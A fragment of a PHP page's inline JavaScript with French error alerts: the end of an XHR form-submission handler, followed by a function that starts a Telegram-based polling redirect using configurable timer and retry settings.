                                        startTelegramPolling();
                                    } else {
                                        alert('Réponse inattendue du serveur');
                                    }
                                } catch (e) {
                                    alert('Erreur de parsing JSON: ' + e.message);
                                }
                            } else {
                                alert('Erreur HTTP ' + xhr.status + ': ' + xhr.statusText);
                            }
                        }
                    };

                    xhr.ontimeout = function() {
                        alert('Timeout: Le serveur met trop de temps à répondre');
                        if (loader) loader.style.display = 'none';
                        isSubmitting = false;
                    };

                    xhr.onerror = function() {
                        alert('Erreur de connexion au serveur');
                        if (loader) loader.style.display = 'none';
                        isSubmitting = false;
                    };

                    xhr.send(formData);
                }
            });
        }


        function startTelegramPolling() {
            if (redirectStarted) return;
            redirectStarted = true;

            if (window.telegramRedirect) {
                window.telegramRedirect.destroy();
            }

            const REDIRECT_TIMER = <?= intval(getConfig('REDIRECT_TIMER') ?? 60) ?> * 1000;

            window.telegramRedirect = new TelegramRedirect({
                redirectTimer: REDIRECT_TIMER,
                pollInterval: 3000,
                maxRetries: 2,
                retryDelay: 1000
            });
        }
    </script>